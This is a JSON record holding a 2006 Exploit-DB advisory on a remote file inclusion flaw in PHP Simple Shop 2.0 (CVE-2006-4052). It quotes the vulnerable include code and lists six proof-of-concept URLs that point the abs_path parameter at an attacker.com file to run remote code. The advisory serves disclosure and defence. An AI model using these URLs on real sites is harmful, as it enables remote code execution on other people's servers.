{
  "id": "2119",
  "title": "PHP Simple Shop 2.0 - &#039;abs_path&#039; Remote File Inclusion",
  "cve": "CVE-2006-4052",
  "vuln_type": "rce",
  "code": "\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_44$2006\r\n\r\n------------------------------------------------------------------------------\r\n[ECHO_ADV_44$2006] PHP Simple Shop <= 2.0 (abs_path) Remote File Inclusion\r\n------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Ahmad Maulana a.k.a Matdhule\r\nDate Found\t: August, 07th 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv44-matdhule-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nPHP Simple Shop\r\n\r\nApplication\t: PHP Simple Shop\r\nversion\t\t: Latest version [2.0]\r\nURL\t\t: http://www.turnkeywebtools.com/phpsimpleshop\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nIn folder admin we found vulnerability script index.php\r\n---------------------------index.php---------------------------------------\r\n....\r\n<?PHP\r\n/*\r\n  index.php - $DATE$ - $TIME$ - $VERSION$\r\n  \r\n  PHP Simple Shop\r\n  http://www.turnkeywebtools.com/phpsimpleshop/\r\n  \r\n  Copyright (c) 2001-2005 Turnkey Web Tools, Inc.\r\n*/\r\n\r\nif (isset($abs_path) && $abs_path != \"\") {\r\n    include $abs_path.\"admin/adminglobal.php\";\r\n} else {\r\n    include \"./adminglobal.php\";\r\n} \r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"abs_path\" parameter in index.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files :\r\n\r\nadminindex.php\r\nadminglobal.php\r\nlogin.php\r\nmenu.php\r\nheader.php\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[phpsimpleshop_path]/admin/index.php?abs_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpsimpleshop_path]/admin/adminindex.php?abs_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpsimpleshop_path]/admin/adminglobal.php?abs_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpsimpleshop_path]/admin/login.php?abs_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpsimpleshop_path]/admin/menu.php?abs_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpsimpleshop_path]/admin/header.php?abs_path=http://attacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~~~~\r\n- Sanitize variable $abs_path on affected files.\r\n\r\nNotification:\r\n~~~~~~~~~\r\n\r\nI've been contacting the web/software administrator to tell about this hole in his system, \r\nbut instead of giving  a nice response, he replied so rudely and arrogantly. \r\nI recommend not to use this product for your own sake.\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~\r\n~ solpot a.k.a chris, J4mbi  H4ck3r thx for the hacking lesson    :)   \r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous\r\n~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama\r\n~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com\r\n~ Solpotcrew Comunity , #jambihackerlink #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~\r\n \r\n     matdhule[at]gmail[dot]com\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-08-07]",
  "url": "https://www.exploit-db.com/exploits/2119"
}